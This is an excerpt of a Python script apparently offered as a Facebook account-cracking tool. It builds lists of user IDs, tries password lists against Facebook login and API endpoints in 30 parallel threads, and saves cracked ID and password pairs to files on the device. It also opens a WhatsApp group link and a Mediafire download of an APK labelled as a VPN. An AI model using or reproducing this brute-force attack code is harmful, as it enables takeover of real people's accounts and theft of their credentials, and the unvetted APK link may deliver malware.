...
os.system('xdg-open https://chat.whatsapp.com/I8y1MQMNZS6JxgnmAAhjM9/?ref=share/')
...
logo=("""\033[1;37m
        ...
        8bodP' dP8561Yb 88  Y8 88 

----------------------------------------------
 \033[1;97m AUTHOR  : MALIK SOHAIL :/
\033[1;97m GitHub : MR-JANI-906:/
\033[1;97m Version:\033[1;92m 1.8 \033[1;97m:/
        ...
        #       chk()
                ...
                if x == ("sex"):
                        ...
                        if xd in ['1','01']:
                                ...
                                plist = []
                                try:
                                        ps_limit = int(input(' PUTT PASSWORD LIMIT: '))
                                except:
                                        ps_limit =1
                                linex()
               ...
               #    #    ##### elif xd in ['7','07']:
                    ##     #       os.system('xdg-open https://mediafire.com/file/y1wvgc2zqqunxbn/JANI_VPN1.0.apk/file');menu()
                 #    ######   elif xd in ['8','08']:
...
def pak():
                ...
                for nmbr in range(limit):
                        ...
                        user.append(nmp)
                with tred(max_workers=30) as JANI:     
                        clear()
                        tl = str(len(user))
...
def ffb(ids,names,passlist):
        global loop,oks,cps
        sys.stdout.write('\r\r\033[1;37m [JANI] %s|\033[1;32mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
        ...
        try:
                ...
                for fikr in passlist:
                        ...
                        JANI=session.cookies.get_dict().keys()
                        if "c_user" in JANI:
                                coki=session.cookies.get_dict()
                                kuki = (";").join([ "%s=%s" % (key, value) for key, value in session.cookies.get_dict().items() ])
                                print('\r\r\033[1;32m [JANI-OK] %s | %s'%(ids,pas))
                                open('/sdcard/JANI-OK.txt', 'a').write(ids+'|'+pas+'\n')
                                oks.append(ids)
                                break
                        elif 'checkpoint' in JANI:
                                if 'y' in pcp:
                                        print('\r\r\x1b[38;5;208m [JANI-CP] '+ids+' | '+pas+'\033[1;97m')
                                        open('/sdcard/JANI-CP.txt', 'a').write(ids+'|'+pas+'\n')
                                        cps.append(ids)
                                        break
                                else:
                                        break
...
def api(ids,names,passlist):
                try:
                        global ok,loop
                        sys.stdout.write('\r\r\033[1;37m [JANI-XD] %s|\033[1;32mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
                        fn = names.split(' ')[0]
                        try:
                                ln = names.split(' ')[1]
                        except:
                        ...
                        for pw in passlist:
                                ...
                                q = json.loads(po)
                                if 'session_key' in q:
                                        print('\r\r\033[1;32m [JANI-OK] '+ids+' | '+pas+'\033[1;97m')
                                        open('/sdcard/JANI-OK.txt','a').write(ids+'|'+pas+'\n')
                                        oks.append(ids)
                                        break
                                elif 'www.facebook.com' in q['error_msg']:
                                        if 'y' in pcp:
                                                print('\r\r\x1b[38;5;208m [JANI-CP] '+ids+' | '+pas+'\033[1;31m ')
                                                open('/sdcard/JANI-CP.txt', 'a').write(ids+'|'+pas+'\n')
                                                cps.append(ids)
                                                break
                                else:
                ...
                try:
                        ...
                        for pas in passlist:
                                ...
                                if 'session_key' in q:
                                        uid=str(q['uid'])
                                        try:
                                                okk=open('/sdcard/JANI-OK.txt','r').read()
                                                if uid in okk:pass
                                                else:
                                                        print('\r\r\033[1;32m [JANI-OK] '+uid+' | '+pas+'\033[1;97m')
                                                        open('/sdcard/JANI-OK.txt','a').write(uid+'|'+pas+'\n')
                                                        oks.append(ids)
                                                        break
                                        except:
                                                print('\r\r\033[1;32m [JANI-CP] '+uid+' | '+pas+'\033[1;31m')
                                                open('/sdcard/JANI-OK.txt','a').write(uid+'|'+pas+'\n')
                                                oks.append(ids)
                                                break
                                else:
